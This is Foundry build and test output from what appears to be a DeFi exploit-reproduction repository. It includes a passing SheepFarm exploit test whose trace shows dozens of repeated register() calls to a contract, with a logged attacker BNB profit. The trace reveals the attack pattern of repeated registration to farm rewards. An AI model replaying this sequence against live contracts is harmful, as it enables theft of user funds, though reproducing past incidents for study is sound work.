Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.13s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 429.65ms (157.18µs CPU time)

Ran 1 test for src/test/2022-11/SheepFarm_exp.sol:ContractTest
[PASS] testExploit() (gas: 1224017)
Logs:
  Attacker BNB profit after exploit: 0.098000000000000000

Traces:
  [1286517] ContractTest::testExploit()
    ├─ [65463] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
